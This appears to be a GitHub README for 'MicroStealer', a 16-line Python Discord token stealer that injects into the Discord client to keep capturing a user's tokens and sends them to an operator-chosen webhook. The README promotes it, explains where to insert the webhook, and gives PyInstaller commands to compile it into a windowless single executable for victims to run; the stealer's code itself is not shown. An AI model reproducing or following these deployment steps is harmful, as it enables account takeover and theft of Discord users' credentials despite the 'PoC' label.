# 💾 MicroStealer
<h2 align="center">⚡ A compact Discord Token Logger/Discord Token Grabber made in only 16 lines of code! Injects into discord for long-term use.</h3>
<h4 align="center">🌟 If you enjoy this, star this repository and drop a follow! Thanks 😊</h3>

The other day, I decided to create a **simple token stealer** using the least amount of lines possible.<br />This is how it came out!<br />

**Please note**, this is more of a <ins>PoC</ins> than a real grabber.<br />You most likely wont be using this.<br />**However**, when compiled with **PyInstaller**, it is quite small!<br />
<h2 align="left">- Features -</h3>

* `Injects, so even if the user changes their token you have it! `
* `Works with any webhook, even if it's not discord! `
* `Only 16 lines of code! `
* `No external modules needed! `

# Usage (If for some reason you want to use it)
**Simple!** Open the file and where it says:<br />
 
```python
webhook = 'YOUR WEBHOOK'
```
<br />
You must replace 'YOUR WEBHOOK' with a valid webhook. Because of the nature of this grabber, you can use any webhook.<br />
(Guilded, Discord, Telegram, even your own server! 👀)

**Enjoy!** 😊

# Compiling to an EXE
With the help of **PyInstaller**, we can convert this script into an EXE file.<br />
To do so, we must open the command prompt to the active directory of the script.<br />
From here, install PyInstaller and compile!

<h3 align="left">Installing PyInstaller</h3>

```
C:\Star\This\Repo> pip install pyinstaller
```

<h3 align="left">Compiling the script</h3>

```
C:\And\Follow\My\Github> pyinstaller --clean --onefile -w {scriptname}.py `
```

**Done!**
